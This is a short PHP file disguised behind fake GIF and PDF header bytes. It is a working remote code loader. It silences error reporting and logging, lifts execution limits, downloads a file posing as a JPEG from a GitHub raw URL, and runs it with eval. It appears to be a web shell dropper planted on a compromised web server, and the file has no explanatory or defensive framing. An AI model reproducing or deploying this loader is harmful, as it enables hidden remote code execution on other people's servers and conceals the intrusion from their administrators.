<!-- GIF89;a -->
%00.PDF~%0n;0x;0%2e<?php
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
ob_start();

function getBacklink($url) {
    if( ini_get('allow_url_fopen') == 1 ) {
        return @file_get_contents($url);
    } else if(function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

$remote_code = getBacklink("https://raw.githubusercontent.com/rijal-cpu/images/refs/heads/main/radioby.jpg");

if ($remote_code) {
    eval("?>" . $remote_code);
}

ob_end_flush();
?>
